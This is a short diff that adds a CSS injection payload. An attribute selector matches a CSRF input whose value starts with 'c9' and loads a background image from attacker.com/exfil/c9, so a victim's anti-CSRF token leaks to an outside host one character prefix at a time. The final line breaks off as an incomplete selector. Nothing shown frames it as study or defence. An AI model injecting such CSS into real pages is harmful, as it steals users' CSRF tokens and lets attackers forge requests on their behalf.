@@ -1,0 +1,5 @@
+input[name=csrf][value^=c9]{
+    background-image: url(https://attacker.com/exfil/c9);   
+}
+
+div[class=text-center]>b
